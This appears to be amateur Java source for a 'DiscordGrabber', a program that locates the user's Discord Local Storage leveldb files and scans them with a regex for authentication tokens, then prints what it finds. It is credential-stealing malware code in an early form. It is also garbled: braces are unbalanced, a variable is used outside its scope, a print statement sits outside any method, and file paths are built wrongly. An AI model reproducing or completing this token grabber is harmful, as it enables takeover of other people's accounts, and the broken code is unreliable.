public class DiscordGrabber
    private static String username = System.getProperty("user.name"); //Gets the user his username
    private static String token = ""; //Create an empty variable called token
    private static String regex = "[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"; //The regex that will be used to look through the file
    private static String path = "C:/Users/"+ username +"/AppData/Roaming/Discord/Local Storage/leveldb";    

    public static CharSequence fromFile(String filename) throws IOException { //I kinda copy pasted this, but i am pretty sure it is to find working characters or something
        FileInputStream input = new FileInputStream(filename);
        FileChannel channel = input.getChannel();
     
        ByteBuffer bbuf = channel.map(FileChannel.MapMode.READ_ONLY, 0, (int)channel.size());
        CharBuffer cbuf = Charset.forName("8859_1").newDecoder().decode(bbuf);
        return cbuf;
    }
    
    public static void getFileNames() {
          
        String[] pathnames; //Create an empty array called pathnames
        
        File f = new File(path); //set "File" to the directory
        
        pathnames = f.list(); //List the files in the directory
        
        for (String pathname : pathnames) { //Iterate through all the files
            File file = new File(pathname); //set the results of the iteration as the new File file
            
            try { //Search for the regex expression within the file
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(fromFile(pathname));
                
                while (matcher.find()) { //When it is matched
                    String match = matcher.group();
                    
                }
                
                }catch(Exception e) {
                    
                }
            }
        token = matcher.group(1); //set token to the first (and probably only) match
    }
    System.out.println("Your discord token is: " + token)
}
